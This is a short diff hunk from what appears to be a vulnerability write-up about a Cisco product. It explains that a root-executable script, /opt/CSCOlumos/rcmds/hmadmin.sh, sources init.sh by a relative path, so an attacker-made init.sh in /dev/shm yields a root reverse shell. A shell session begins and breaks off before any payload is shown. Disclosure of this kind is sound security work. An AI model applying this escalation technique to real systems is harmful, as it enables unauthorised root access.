@@ -34,7 +34,7 @@ $INSTALL_HOME/bin/hmadmin.sh
 ```
 
 It first executes `init.sh`, which is a script doing a lot of stuff (e.g. set the `$INSTALL_HOME` environment variable to `/opt/CSCOlumos`), but most importantly, its path is not absolute. This means that we can be in any directory executing `/opt/CSCOlumos/rcmds/hmadmin.sh`, and the it will search for `init.sh` in our current working directory. Because we can execute `/opt/CSCOlumos/rcmds/hmadmin.sh` as root, and that script executes `init.sh` in our CWD (in this case /dev/shm), we can create an `init.sh` which gives us a reverse shell.
-```bash
+```
 [prime@ip-10-128-2-125 shm]$ pwd
 /dev/shm
 [prime@ip-10-128-2-125 shm]$ ls
